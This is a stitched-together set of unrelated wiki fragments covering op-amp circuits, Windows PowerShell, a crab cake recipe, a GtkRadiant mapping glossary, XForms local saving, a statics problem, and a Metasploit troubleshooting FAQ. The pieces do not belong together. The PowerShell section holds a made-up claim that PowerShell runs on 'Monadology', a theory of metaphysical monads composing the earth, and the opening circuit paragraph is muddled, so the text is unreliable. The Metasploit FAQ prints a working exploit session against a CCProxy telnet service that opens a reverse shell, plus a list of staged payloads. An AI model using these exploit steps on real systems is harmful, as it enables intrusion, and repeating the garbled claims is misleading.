Let see the polarity of disturbance in &quot;passive&quot; picture.The current will flow in conventional way from + wire to - wire through capacitor. As we know the output of an op-amp is a voltage source ,but it's input a current source.(Voltage source has small infinite resistence, ideally zero, but in reality fractions of ohms, even ohms).The Norton replacement of current source with voltage source series with a high resistence equal with in-between armature resistence make the op-amp feasible.
The polarity in &quot;passive&quot; circuit for C Norton replacement with voltage source will be with + connected to minus of initial voltage source.

Windows PowerShell '''(codenamed:Monad)''' is a command-line driven interface (CLI). It is not supplied with older versions of Windows Vista, but it could be used, regardless, in Windows XP, Windows 2003 Server and Windows Vista.

Windows PowerShell is the foundation of the administrative tools for Exchange Server 2007, System Center Virtual Machine Manager 2007 and System Center Operations Manager 2007 where everything is done via command line interfaces and the administrative GUI is layered on top of those commands.


== Working ==

Windows PowerShell works according to a system called &quot;Monadology&quot; according to which the whole earth is composed of metaphysical structures not connected to each other called monads. The &quot;monads&quot; of Windows PowerShell are objects called &quot;cmdlets&quot;. Following the failure of Windows Script Host, Microsoft started working on Windows PowerShell as early as 2003. Unlike Windows Script Host, Windows Powershell interacts directly with the shell and is highly secure.

Instead of services which use pipes or streams data in order to communicate with each, Windows Powershell uses object-to-object communication between two cmdlets in different remote machines. A listing of processes will consist not of text describing them, but objects representing them, so that methods can be called on those objects without explicit reference to any outside structure or library.

Windows PowerShell operates within a hosting application (the default is powershell.exe) that exposes a command line to the user and uses a host interface to communicate with the commands invoked by the command line. The hosting application can be a console application, a Windows application, or a Web application. In most cases, the hosting application uses its ''Main'' function to interact with the Windows PowerShell runtime through the internal host interface; however, a hosting application can optionally support its own custom host by implementing the PSHost class along with one or more related user interface classes. Together, these classes allow direct communication between the application and Windows PowerShell commands.

=== Creating a Runspace ===

The first thing that the hosting application must do in communicating with the Windows PowerShell runtime is to create a runspace, which is the abstraction of the Windows PowerShell runtime used to simplify a user session. To do this, the hosting application calls the CreateRunspace method of the RunspaceFactory class. The runspace itself is represented by a Runspace object. In addition, Windows PowerShell provides the RunspaceConfiguration class to define the configuration of the runspace. Configuration information includes data about commands and Windows PowerShell providers that the hosting application supports, and startup scripts for the runspace. User scripts are not reflected in the runspace configuration. When a runspace is created, a corresponding session is automatically opened, with its state represented by a SessionState object. Session state data includes information about Windows PowerShell paths, Windows PowerShell drives, Windows PowerShell providers, plus cmdlets and other commands that are active during the session.

=== Opening the Runspace ===

When the hosting application has created a runspace, it must open the runspace for the type of session that is required. For a session using synchronous I/O, the application can call the Open method. If the application uses asynchronous I/O and must perform other operations while the runspace fulfills a read/write request, it can call the OpenAsync method. If calling OpenAsync, a hosting application defining a custom host will need to support an appropriate callback method to receive I/O notifications.

When the runspace is opened, the hosting application can manipulate the session by creating and invoking pipelines in the runspace, as described in Processing Commands.

The runspace allows the hosting application to manipulate the session with calls to the GetVariable and SetVariable methods of the SessionStateProxy object for the session.

=== Creating a Pipeline ===

When the hosting application has accumulated a command sequence from the user, it must form the commands into one or more pipelines, each represented by a Pipeline object for the active runspace. 

A command sequence can be made up of multiple nested pipelines, separated by semicolon (;) statement separators. Here's an example of such a sequence.

PS&gt;pqr | bar; a | b 

The Windows PowerShell runtime represents this sequence as one pipeline with two nested pipelines, pqr | bar and a | b.

To create its own pipeline, the hosting application calls either the CreatePipeline method or the CreateNestedPipeline method. The application calls CreatePipeline to form an empty pipeline or if it must create a pipeline and populate it with commands. If the application must create a pipeline for a runspace with its current pipeline executing, it must call CreateNestedPipeline.

=== Starting the Pipeline ===

Now that its pipeline is set up, the hosting application must start its operation. If the application is using synchronous I/O, it calls the Invoke method, using the variant for either an empty pipeline or a populated one. For asynchronous I/O, the application can call InvokeAsync instead.

== Features ==

The first version contains the following features:
* A C#-like scripting language with support for hash tables, switch statements which can test on regular expressions, array slicing and anonymous methods (script blocks) which can be stored as data and then later executed. It also provides looping (for/foreach/while), conditional statements (if/switch), variable scoping (global/script/local) and the abililty to define functions.
* Cmdlets inherit certain options, allowing the user to choose things such as the level of interaction and how to deal with errors. Cmdlets which produce side effects support the options &lt;code&gt;-WhatIf&lt;/code&gt; and &lt;code&gt;-Confirm&lt;/code&gt;. &lt;code&gt;-WhatIf&lt;/code&gt; informs the user what would have happened, but no action takes place. &lt;code&gt;-Confirm&lt;/code&gt; informs the user what is about to happen and allows the user to control whether it takes place or not.
* One option for dealing with errors is to invoke a &quot;suspend&quot; feature which allows the user to enter a new command shell, investigate a problem, and resume the original command. The user can define the prompts to be shown in such circumstances. 
* An extensible ''provider'' model allows access to and manipulation of the file system and other hierarchical data stores. Some examples: PowerShell comes with a registry provider which allows access to the registry via the &quot;HKLM&quot; and &quot;HKCU&quot; hives; with this, the registry can be browsed by executing commands like &quot;dir HKLM:\SOFTWARE\Microsoft&quot; at the shell prompt. PowerShell comes with providers for the certificate store, the environment, and shell functions and aliases. Like cmdlets, the provider model is extensible, allowing third parties to create their own provider model and plug it into PowerShell.
* A concept called &quot;execution policies&quot; which allows coarse security constraints to be imposed upon PowerShell script execution. Execution policies define the restrictions under which PowerShell loads configuration files and runs scripts. The four execution policies are Restricted, AllSigned, RemoteSigned, and Unrestricted.
* Support for the use of script signing to verify the identity of a script publisher and to validate the integrity of a published script using digital signatures.
* The command-line options are generally whole words, but they can be specified as the minimum number of letters necessary to disambiguate. For example, the option &lt;code&gt;-show-detailed-information&lt;/code&gt; could be entered as &lt;code&gt;-s&lt;/code&gt; if no other option begins with 's'.
* Comprehensive, user-extensible tab completion features. The cmd.exe shell in current versions of Windows can only complete file or directory names, in contrast to the advanced completion in shells such as Bash and zsh.
* The ability to assign the output of a command to a variable, which will then be an object or array of objects inspectable in any way desired.

==Ingredients==

* 1 [[Cookbook:Teaspoon|teaspoon]] Florida Bay seasoning (see note)
* ½ [[Cookbook:Cup|cup]] [[Cookbook:Mayonnaise|mayonnaise]]
* 1 [[Cookbook:Egg|egg]]
* ½ [[Cookbook:Tablespoon|tablespoon]] [[Cookbook:Dijon Mustard|Dijon mustard]]
* ¼ teaspoon [[Cookbook:Cayenne pepper|cayenne]]
* 1 tablespoon thinly sliced [[Cookbook:Chive|chives]]
* 1 tablespoon finely [[Cookbook:Chopping|chopped]] [[Cookbook:Cilantro|cilantro]]
* ½ teaspoon [[Cookbook:Coriander|ground coriander]]
* [[Cookbook:Lime|juice of ½ lime]]
* [[Cookbook:Pepper|white pepper]], to taste

==Procedure==

# Combine Florida Bay seasoning, mayonnaise, egg, mustard, cayenne, chives, cilantro, coriander, and lime juice in a large mixing bowl.
# Season to taste with white pepper and kosher salt.
# Fold in the bread crumbs and crabmeat as gently as possible, trying to avoid breaking up the lumps.
# Rest mixture in the refrigerator ½ to 2 hours.
# Divide and shape into 5 patties.
# Heat butter in a large heavy-bottomed [[Cookbook:Skillet|skillet]] or [[Cookbook:Sautéing|sauté]] pan over medium-high heat.
# Cook the crab cakes in the butter about 2 minutes per side, until golden brown on both sides.
# Lower heat to medium and cook until the cakes are hot but still moist on the inside, about an additional 3 to 5 minutes per side.

==Tips, Notes, and Variations==

* Note: Florida Bay seasoning, also known as Old Florida Bay seasoning and Florida seasoning, may be difficult to find locally. It is available through several Internet-based merchants (Google &quot;Florida Bay seasoning&quot;).
* Alternatively, you could substitute Old Bay seasoning.

Here I will list all those terms people will have difficulties understanding, i will expand this while writing and add all difficult words to this list as the book is growing, I'll start with some basic words.  

__NOTOC__
{{compactTOC8|center=yes}}
====A====
;&lt;span id=&quot;alphashadows&quot; style=&quot;font-weight: bold&quot;&gt;Alpha Shadows&lt;/span&gt;
: A technique for lighting in a map that results in controlled shadows in the finished map. Typically, it is used to project shadows through textures such as grates or glass that are partially or mostly transparent, simulating realistic shadowing on the recieving surface.

;&lt;span id=&quot;areaportal&quot; style=&quot;font-weight: bold&quot;&gt;Areaportal&lt;/span&gt;
: An areaportal is a type of brush, defined by using the system/areaportal texture.  Areaportals are most commonly used in doors.  They block the -VIS process ingame, meaning your computer does not draw what is behind the areaportal.  When the door containing the areaportal is triggered, it tells your computer to render and draw the room behind the areaportal.  This is a very common, simple, and effective technique to improve FPS in a map.

====B====
;&lt;span id=&quot;brush&quot; style=&quot;font-weight: bold&quot;&gt;Brush&lt;/span&gt;
: The basic building block of GTKRadiant. It is used primarily to define the physical structure of the area being designed. The term brush is used by GTK to refer to anything that is not an entity, and therefore also encompasses patch meshes. A brush can be made to represent anything from solid matter (metal, dirt, wood, etc.) to liquids (lava, water, etc) to gases (fogs), depending on the textures and shaders applied to them.

====C====
;&lt;span id=&quot;caulk&quot; style=&quot;font-weight: bold&quot;&gt;Caulk&lt;/span&gt;
: A System shader designed to 'caulk' or seal a map. In-game, it is a transparent solid texture. It is best applied to all surfaces which a player will be unable to see while in-game.
;&lt;span id=&quot;clipper&quot; style=&quot;font-weight: bold&quot;&gt;Clipper&lt;/span&gt;
: The Clipper Tool is used to clip (IE, cut away) parts of a brush in order to alter it's shape. This is generally used to turn a standard 6 sided brush into a brush with fewer or more sides, depending on what is required for it's placement. It has two versions; two-point clip cuts along a single plane, and three-point clip can create a cut along all three dimensions, depending on point placement.

====D====


;&lt;span id=&quot;detailbrush&quot; style=&quot;font-weight: bold&quot;&gt;Detail Brush&lt;/span&gt;
: A detail brush is a type of brush that does not block the -VIS stage of the compiler.  In short, any brush that does not provide structure/seal to a room, and merely is there to detail the room, should be made a detail brush [ctrl + M]

====E====
;&lt;span id=&quot;entity&quot; style=&quot;font-weight: bold&quot;&gt;Entity&lt;/span&gt;
: An object used to interact with the game, see [[GtkRadiant/Entities]].
;&lt;span id=&quot;entitywindow&quot; style=&quot;font-weight: bold&quot;&gt;Entity Window&lt;/span&gt;
: See [[GtkRadiant/The Entity Window]].

====F====
Fog

====G====
;&lt;span id=&quot;grid&quot; style=&quot;font-weight: bold&quot;&gt;Grid&lt;/span&gt;
: A grid is a framework with vertical and horizontal lines in unison used to structure content. The grid, in GtkRadiant, is to the left, where you build your world.

====H====
====I====
====J====
====K====
====L====

'''Light'''
: A light is an entity that creates light and adds color to surfaces of brushes around it.  Proper lighting can make any map look appealing.

====M====

;&lt;span id=&quot;model&quot; style=&quot;font-weight: bold&quot;&gt;Model&lt;/span&gt;
:A model is a premade piece of geometry which you can put into your map. The models available differ from game to game.

====N====

;&lt;span id=&quot;npc&quot; style=&quot;font-weight: bold&quot;&gt;Npc&lt;/span&gt;
:Npc is an abbreviation of non-player character (sometimes &quot;non-playable character&quot; or &quot;non-player class&quot;). It's a character in a computer game whose actions are not controlled by a human player.

====O====
;&lt;span id=&quot;origin&quot; style=&quot;font-weight: bold&quot;&gt;Origin&lt;/span&gt;
: The center point of the map, i.e. &lt;tt&gt;0,0,0&lt;/tt&gt;.

====P====
;&lt;span id=&quot;patchmesh&quot; style=&quot;font-weight: bold&quot;&gt;Patch Mesh&lt;/span&gt;
: A sub-type of brush used to simulate curves in the Quake 3 engine. It is generated by a matrix of vertexes which can be moved independently of each other to form the curved shape. GtkRadiant has three standard types (Bevel, Endcap, and Cylinder) that will generate most needed curves, as well as the ability to create 'simple patch meshes' that allow for a free-form shaping. Patch Meshes are only visible from one side, and cannot be used reliably for fog, water, or any other spatial type of shader effect.
;&lt;span id=&quot;prefab&quot; style=&quot;font-weight: bold&quot;&gt;Prefab&lt;/span&gt;
:A ''prefab'' are a group of brushes which can be imported to your map. The difference between a ''prefab'' and a model are that prefabs sill consist of individual brushes whereas models are made out of already compiled polygons.

====Q====
;&lt;span id=&quot;Q3Map&quot; style=&quot;font-weight: bold&quot;&gt;Q3Map&lt;/span&gt;
:''Q3Map2'' The original tool created by Id to compile maps for the 'id tech 3' engine.
;&lt;span id=&quot;Q3Map2&quot; style=&quot;font-weight: bold&quot;&gt;Q3Map2&lt;/span&gt;
:''Q3Map2'' Vastly improved Q3Map by ydnar.

====R====
====S====
;&lt;span id=&quot;script&quot; style=&quot;font-weight: bold&quot;&gt;Script&lt;/span&gt;
: A script is a set of written instructions used by the Quake 3 Engine to produce certain specific effects. There are two primary types - ''Shaders'' and ''Icarus Scripts''. Typically, usage of the word script in forums or other media is a reference to the later, while the former is commonly referred to as a shader. Icarus Scripts are used to create effects in-game that can do anything from move a brush or set of brushes from point A to point B all the way to full Cinematics in SP games.
;&lt;span id=&quot;shader&quot; style=&quot;font-weight: bold&quot;&gt;Shader&lt;/span&gt;
: A script which defines the properties of the surface it is applied to. In fact, all textures which don't have a shader associated to them automatically get a default shader. Shaders are used to make lights glow, make floors be reflective, or make things non-solid or even water. Actually any special property a surface has is set by its shader. There are also many default shaders that come with the game such as {{GtkRGloss|caulk|''caulk''}}. In GtkRadiant all shaders have a white border around them when browsed in the textures browser.

;&lt;span id=&quot;shader&quot; style=&quot;font-weight: bold&quot;&gt;Skybox&lt;/span&gt;
A technique to make a more plastic sky.

====T====
;&lt;span id=&quot;texture&quot; style=&quot;font-weight: bold&quot;&gt;Texture&lt;/span&gt;
: An image or graphic which can be applied to a surface. See also {{GtkRGloss|shader|shader}}.

====U====
====V====
;&lt;span id=&quot;vertex&quot; style=&quot;font-weight: bold&quot;&gt;Vertex&lt;/span&gt;
: The points between which the faces of the brush are drawn, usually the corners of a brush.
;&lt;span id=&quot;void&quot; style=&quot;font-weight: bold&quot;&gt;Void&lt;/span&gt;
: The gray area outside of the map itself, where nothing is. If there's a way to get to this area from any entity in the map, the map is leaked.

====W====
;&lt;span id=&quot;worldspawn&quot; style=&quot;font-weight: bold&quot;&gt;Worldspawn&lt;/span&gt;
: The entity that contains all the regular brushes in your map, so every brush you create will be added to the worldspawn entity.

====X====
====Y====
====Z====
;&lt;span id=&quot;zfighting&quot; style=&quot;font-weight: bold&quot;&gt;Z-Fighting&lt;/span&gt;
: A common mapping error relating to texture placement and brush alignment. It is cause when the faces of two brushes either completely or partially occupy the same plane, and are textured with either two different textures or the same texture with different settings. Visually in game, it is characterized by that plane showing both textures at the same time on that face, resulting is what looks like the textures 'fighting' to be shown.</text>

You have probably already done the [[GtkRadiant/installation]] or at least found out what GtkRadiant is, otherwise you would not have found this book, but, to tell it again, its a Level Design program also known as mapping program, with it, you make and design maps to play in all games based on the ''id Tech 3 engine''. Technically, ''GtkRadiant'' will create &lt;tt&gt;.map&lt;/tt&gt; files, which then are compiled by the compiler [[Q3Map2]]. You have probably already downloaded a few maps, and are now interested in making some maps yourself, if this is the case, then this is a good place to learn. If you already have mapped for some time, but want to learn a bit more, this will be a good place to learn, after I have written some more stuff.

Game packs exist for the following games. Generally, this includes support for all expansions and modifications as well.

* ''Doom 3''- A Windows-only variant called D3Radiant (based on Q3Radiant, not GtkRadiant) is integrated into Doom 3. GtkRadiant 1.5.x can be used to make Doom 3 maps in Linux, by utilizing Doom 3's integrated map compiler in conjunction.
* ''Quake''
* ''Quake II''
* ''Quake III Arena''
* ''Quake 4''- Being based on the ''id tech 4'' engine, it also uses a version of D3Radiant internally. However, GtkRadiant 1.5 can still be used to create maps on Linux.
* ''Return To Castle Wolfenstein''
* ''Wolfenstein: Enemy Territory''
* ''Half-Life''
* ''Heretic II''
* ''Soldier of Fortune II: Double Helix''
* ''Star Trek: Voyager Elite Force''
* ''Star Wars Jedi Knight II: Jedi Outcast''
* ''Star Wars Jedi Knight: Jedi Academy''
* ''Medal of Honor: Allied Assault''
* ''Call of Duty''
* ''Call of Duty 2''
* ''Nexuiz''
* ''Xonotic''
* ''Tremulous''
* ''War§ow''
* ''Prey''
* ''Darkplaces''
* ''UFO: Alien Invasion''

In addition, the following games and projects use GtkRadiant as a map editor, by using the GtkRadiant ''Quake III Arena'' game pack and an external map compiler or converter:

* ''Neverball''
* Crystal Space game engine
* Irrlicht Engine (supports Q3A .bsp files)
* ''Blob Wars : Blob And Conquer'' (custom game pack)</text>

Now that you have downloaded, installed and started GtkRadiant, you will probably start to draw around a bit with your mouse, and you will see that where ever you draw on the grid, a red square will appear, now you may think, is this really the program all others made those awesome maps in, the answer is probably yes, so, how is this done, first of all, you have to learn the interface.

{{B3D:N2P/VTT1
|image=ScreenshotMainRadiant.png
|imageWidth=1024px

|type1=text
|top1=18%
|width1=40%
|label1=2D Viewport
|text1=
&lt;p&gt;This is the '''2D Viewport''', in here you can either see your map from above, from the front, or from the right. To change the view, press '''CTRL+TAB''' or click the [[Image:XYZButtonRadiant.png|22px]] button in the toolbar. This is also where you create {{GtkRGloss|brush|''brushes''}}, to create a brush, just drag with your mouse.
&lt;/p&gt;

|type2=text
|top2=18%
|left2=55%
|width2=40%
|label2=3D Viewport
|text2=This is the '''3D Viewport''', in this view you can see your created map in 3D, similar to what it would look in game. To navigate in the window, right click anywhere in the window and you can look around by moving the mouse. You can also use the mouse wheel to scroll back and forth as well as the arrow keys to strafe in any direction.

|type3=text
|top3=65%
|left3=40%
|width3=55%
|label3=Texture Browser
|text3=This is the '''Texture Browser''' with which you browse and choose the {{GtkRGloss|texture|''texture''}}(s) which you can apply to the geometry. On the left side you see a list of folders from which you can choose the textures, double click a folder to display its content on the right side of the panel.

|type4=text
|top4=85%
|width4=95%
|label4=Console
|text4=
&lt;p&gt;This is the '''Console''' where GtkRadiant prints down every major (or minor) thing it's doing. This is very useful if you get error messages or if something else doesn't work like it should. Note that all critical stuff is displayed in &lt;span style=&quot;color: #c00;&quot;&gt;'''red'''&lt;/span&gt; color.&lt;/p&gt;

      <text xml:space="preserve">= &lt;font color=&quot;red&quot;&gt;NOTE - this page is in development&lt;/font&gt; =

= Saving Intermediate Form Data =
This example will show you how to save intermediate form data to a local disk.

= Motivation =
Sometimes long forms take a while to fill out.  You would like to allow users to fill out part of a form, log off, and resume their form when they return.  Sometimes this intermediate data can be used as a default template for fields that are re-entered frequently by form users.

= Cross Domain Posting A Security Concern =
By default, XForms will not allow a form to be served from one domain and then access another domain without the user being warned.  This could allow a nefarious form to access local files without authorization.

This is reflected in the fact that the &quot;src&quot; tag in the instance can only reference a hard-coded static string.  You can not load a local file into an instance if the form was loaded from a web server.

Note that you can read and write a local file on the local file system with an XForms application that supports the file: type such as FireFox.  But the forms must have this path statically coded into the XForms instance src attribute.

= Steps =

== Step 1: Save to Client ==
Save instance data:

&lt;source lang=&quot;xml&quot;&gt;
   &lt;xf:submission id=&quot;save-instance-to-client&quot;
      method=&quot;put&quot;
      action=&quot;file://C:/tmp/xforms/my-data.xml&quot;
      replace=&quot;instance&quot;
      instance=&quot;my-instance&quot;
    /&gt;
&lt;/source&gt;

== Step 2: Read From Client ==
Save instance data:

&lt;source lang=&quot;xml&quot;&gt;
   &lt;xf:submission id=&quot;read-instance-from-client&quot;
      method=&quot;get&quot;
      action=&quot;file://C:/tmp/xforms/my-data.xml&quot;
      replace=&quot;instance&quot;
      instance=&quot;my-instance&quot;
    /&gt;
&lt;/source&gt;

Note that to find the file you can use the &lt;xf:upload&gt; control:

&lt;source lang=&quot;xml&quot;&gt;
   &lt;xf:upload ref=&quot;FilePath&quot;&gt;
      &lt;xf:mediatype&gt;text/xml&lt;/xf:mediatype&gt;
   &lt;/xf:upload&gt;
&lt;/source&gt;

The value of the &lt;code&gt;action&lt;/code&gt; attribute in both &lt;code&gt;xf:submission&lt;/code&gt;s &lt;code&gt;save-instance-to-file&lt;/code&gt; and &lt;code&gt;read-instance-from-file&lt;/code&gt; should be a variable: &lt;code&gt;action=&quot;file://C:/tmp/xforms/my-data.xml&quot;&lt;/code&gt; should be automatically changed to &lt;code&gt;FilePath&lt;/code&gt; value.

= Solution =

To get this to work you have to deal with the security concerns...

= Notes =
There was a reference to using the chrome:// prefix not the file:// prefix on one posting..but no example was given.  There was also some discussion of saving to a cookie using cookie://

      <text xml:space="preserve">There are many structural problems in statics that do not involve a truss.  For example, a beam is not loaded axially.  A beam is analyzed in terms of bending moments and shear.  Many simple tools can be analyzed with statics.

==Example 1==

===Question===

[[Image:StaticsPliers1.svg|thumb]]

The picture to the right shows a tool used to compress springs.  In the tool's current state a person is squeezing the pliers with 40 Newtons applied to each handle to hold the spring(shown in orange) in a steady partially compressed state.  The black circle is a pin (a pin can transfer forces, but cannot resist turning).  The forces used to squeeze the pliers are vertical in addition to the forces applied on the spring.

Find the compressive force on the spring and the force on the pin.

====Hint====
Think of how the plier components can be disassembled and analyzed for equilibrium.



===Answer===

[[Image:StaticsPliersIsolated.svg|thumb|left]]

If the pin in the question's picture was welded to the hole it fits in, the force from the spring could be any value; however, the pin is free to rotate (it can't resist a turning moment) so the picture to the left can be used for further analysis.

If moments are summed about the black pin (let's designate it &quot;pin A&quot;), the spring force(designated &quot;F&quot;) can be solved for.

&lt;math&gt;\sum M_A = 0 = -6 in*40N + 2 in*F&lt;/math&gt;

&lt;math&gt;\ F = 120N &lt;/math&gt;

This means the spring is being compressed with 120N.

The force in the pin can be solved for with force equilibrium.  Let's call the pin's &lt;math&gt; x &lt;/math&gt; force &lt;math&gt; P_x &lt;/math&gt; and the &lt;math&gt; y &lt;/math&gt; force &lt;math&gt; P_y &lt;/math&gt;.

&lt;math&gt;\sum F_x = 0 = P_x &lt;/math&gt;

&lt;math&gt;\sum F_y = 0 = 40N + P_y + 120N &lt;/math&gt;

&lt;math&gt;\ P_y = -160N &lt;/math&gt;

Since the equations were written in terms of the assumed force directions pictured and since &lt;math&gt; P_y &lt;/math&gt; is negative, the force acts in the opposite direction as shown in the picture.

[[Image:StaticsPliersPin.svg|thumb]]

'''The pin exerts a downward force on the handle shown in the left picture, but it exerts an upward force of the same magnitude on the other handle.'''  This statement is very important and can be further explained by the picture to the right.  The picture shows a dark gray and light gray rectangle.  The light and dark gray corresponds to the previous pictures.  The black rectangle represents the pin which goes through both handles as indicated with dashed lines.  The dark handle is exerting an upward force of 160N on the pin and the light handle is exerting a downward force of 160N on the pin.  Because the forces are equal and opposite the pin does not travel vertically.  The force from the dark handle is transmitted through the pin to the light handle and the force from the light handle is transmitted through the pin to the dark handle.  '''The pin is in 160N of shear'''.

===no such file to load -- openssl (LoadError)===

Q: When running Metasploit for the first time, I get the error: ''no such file to load -- openssl (LoadError)''

*Example:

&lt;pre&gt;
[~/metasploit]# ./msfgui
./lib/rex/socket/ssl_tcp_server.rb:4:in `require': no such file to load -- openssl (LoadError)
        from ./lib/rex/socket/ssl_tcp_server.rb:4
        from ./lib/rex/socket/comm/local.rb:5:in `require'
        from ./lib/rex/socket/comm/local.rb:5
        from ./lib/rex/socket.rb:22:in `require'
        from ./lib/rex/socket.rb:22
        from ./lib/rex.rb:71:in `require'
        from ./lib/rex.rb:71
        from ./msfgui:10:in `require'
        from ./msfgui:10
&lt;/pre&gt;

A: Metasploit requires the Ruby implementation of openssl - not the standard C implementation of openssl used by Apache etc. Install the relevant ruby-openssl library.

*Example (for Debian - check your OS or try using ''gem''):
&lt;pre&gt;
pwebster@metasploit:~$ apt-cache search ruby | grep openssl
libopenssl-ruby - OpenSSL interface for Ruby
libopenssl-ruby1.8 - OpenSSL interface for Ruby 1.8
libopenssl-ruby1.9 - OpenSSL interface for Ruby 1.9

pwebster@metasploit:~# apt-get install libopenssl-ruby 
&lt;/pre&gt;

==Errors==

===Exploit failed: No encoders encoded the buffer successfully===

Q: After setting all the required parameters for an exploit module and running ''exploit'', I receive the following error: ''[-] Exploit failed: No encoders encoded the buffer successfully.''

*Example:

&lt;pre&gt;
msf &gt; use windows/proxy/ccproxy_telnet_ping
msf exploit(ccproxy_telnet_ping) &gt; info

  RPORT  23               yes       The target port     

Payload information:
  Space: 200
  Avoid: 5 characters

Description:
  This module exploits the YoungZSoft CCProxy &lt;= v6.2 suite Telnet 
  service. The stack is overwritten when sending an overly long 
  address to the 'ping' command.

msf exploit(ccproxy_telnet_ping) &gt; set TARGET 4
TARGET =&gt; 4
msf exploit(ccproxy_telnet_ping) &gt; set PAYLOAD windows/shell_reverse_tcp 
PAYLOAD =&gt; windows/shell_reverse_tcp
msf exploit(ccproxy_telnet_ping) &gt; set LHOST 127.0.0.1
LHOST =&gt; 127.0.0.1
msf exploit(ccproxy_telnet_ping) &gt; check 
[*] The target appears to be vulnerable.
msf exploit(ccproxy_telnet_ping) &gt; exploit 
[-] Exploit failed: No encoders encoded the buffer successfully.
&lt;/pre&gt;

A: The payloads available (''show payloads'') are determined by the memory 'Space' available for the exploit to use. In the above example, the payload space is: 'Space: 200'.
However, the target application does not allow certain characters to be used (usually the null character '''0x00''' as this denotes the end of a string [character array]). In the example the payload cannot permit five characters: 'Avoid: 5 characters '

When you run the exploit, the payload generators will attempt to fit your desired payload into a space of 200 which excludes 5 specific characters. This is not always possible, and will result in the error: ''No encoders encoded the buffer successfully''.

However, all is not lost. The Metasploit Framework includes the ability to support ''staged'' payloads. A staged payload is a significantly smaller payload which, instead of executing your desired action (such as reverse shell), will start a staging platform which can then add to that platform. So in our example, instead of a complete reverse shell, it will:

# Create the staging platform.
# Allocate enough memory to hold your desired payload.
# Obtain the rest of the payload from you.
# Execute the payload as a whole.

Generally, all the staged exploits are denoted by the '/' after the desired payload. Some examples are:

&lt;pre&gt;
   windows/dllinject/reverse_tcp          Windows Inject DLL, Reverse TCP Stager                                                       
   windows/download_exec/bind_tcp         Windows Executable Download and Execute, Bind TCP Stager                                                                     
   windows/exec/find_tag                  Windows Execute Command, Find Tag Ordinal Stager                                                       
   windows/meterpreter/reverse_tcp        Windows Meterpreter, Reverse TCP Stager                              
   windows/shell/reverse_tcp              Windows Command Shell, Reverse TCP Stager                                                     
   windows/upexec/bind_tcp                Windows Upload/Execute, Bind TCP Stager                           
   windows/vncinject/reverse_ord_tcp      Windows VNC Inject, Reverse Ordinal TCP Stager                       
&lt;/pre&gt;

So now that we know it cannot fit an 'Inline' payload, we can use a stager instead:

&lt;pre&gt;
...
msf exploit(ccproxy_telnet_ping) &gt; exploit 
[-] Exploit failed: No encoders encoded the buffer successfully.
msf exploit(ccproxy_telnet_ping) &gt; set PAYLOAD windows/shell/reverse_tcp
PAYLOAD =&gt; windows/shell/reverse_tcp
msf exploit(ccproxy_telnet_ping) &gt; exploit 
[*] Started reverse handler
[*] Trying target Windows 2000 Pro SP4 - English on host 127.0.0.1:23...
[*] Sending stage (474 bytes)
[*] Command shell session 8 opened (127.0.0.1:4444 -&gt; 127.0.0.1:2016)

Hi and thanks for the contribution.  However this should be a &quot;subpage&quot; of the Ruby book.  The naming format here is Book name/Sub page name.  Short of time for now but it is easy to do - just use the &quot;move&quot; tab and put the name in there.  Call for help tho  if you need it.

&lt;span style=&quot;font-size:100%; color:#FF0000&quot;&gt;'''Circuit idea:''' ''The op-amp compensates the internal losses caused by the resistor adding as much voltage to the input voltage source as it loses across the resistor.''&lt;/span&gt;

   
[[Image:Active_i-to-v_how_to_convert_1000.jpg|right|thumb|250px|&lt;center&gt;Fig. 1. How do we transform the imperfect passive current-to-voltage converter into a perfect op-amp one?&lt;/center&gt;]]

== Speculation: ''The active version is just an improved passive one'' ==

We have already revealed the secret of the most popular simple converting circuit - [[Circuit Idea/Passive Current-to-Voltage Converter|passive current-to-voltage converter]]. We know that these kinds of circuits have usually two versions - passive (&quot;bad&quot;) and active (&quot;good&quot;). When we were considering the opposite voltage-to-current converter, we ascertained that there was a close interrelation between the two versions - the [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter|active]] circuit was come from the [[Circuit Idea/Passive Voltage-to-Current Converter|passive]] one; it was just an improved passive version. Furthermore, we figured out how the passive version was transmuted into an active one.

Similarly, we may now suppose that there is an active current-to-voltage converter and its  [[Circuit Idea/Passive Current-to-Voltage Converter|passive]] and active versions are interrelated too. Then, let's look at these two circuit implementations  - the &quot;bad&quot; passive version (the top of Fig. 1) and the &quot;good&quot; active version (the bottom of Fig. 1). We can see again that the active version contains the passive one + an op-amp connected in accordance with some (maybe the same?) powerful idea:

&lt;center&gt;&lt;span style=&quot;font-size:130%; color:#999999&quot;&gt;'''''Active I-to-V converter = passive I-to-V converter + op-amp + great idea ?''&lt;/span&gt;&lt;/center&gt;

Again, we might ask ourselves, &quot;How have the passive circuit transmuted into an active one?&quot;, &quot;What is the idea of this connection?&quot; and &quot;What does the op-amp do in this circuit?&quot; We can answer these questions by following the evolution of the [[Circuit Idea/Passive Current-to-Voltage Converter|passive circuit]] into an active one.

== Problem: ''The internal resistor affects the current'' ==

[[Image:Passive_i-to-v_converter_1000.jpg|right|thumb|400px|Fig. 2. The internal resistor affects the current in the passive current-to-voltage converter.]]

We have already known why the [[Circuit Idea/Passive Current-to-Voltage Converter|simple current-to-voltage converter]] (Fig. 2) is an imperfect circuit - because the output voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R affects the input current (here we suppose that the input current is created by a real source consisting of a voltage source V&lt;sub&gt;IN&lt;/sub&gt; and an internal resistance Ri).

We can look at the voltage V&lt;sub&gt;R&lt;/sub&gt; from two contrary viewpoints. From the point of view of the input voltage source, the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is troublesome; so, the input source &quot;would like&quot; this voltage not to exist. Contrary, from the point of view of the load, V&lt;sub&gt;R&lt;/sub&gt; is a useful voltage drop as it serves as an output quantity; so, the load &quot;would like&quot; this voltage to exist and even it to be as much as possible high. Obviously, there is a contradiction here - the voltage drop V&lt;sub&gt;R&lt;/sub&gt; has to exist and, at the same time, not to exist. How do we solve this contradiction?

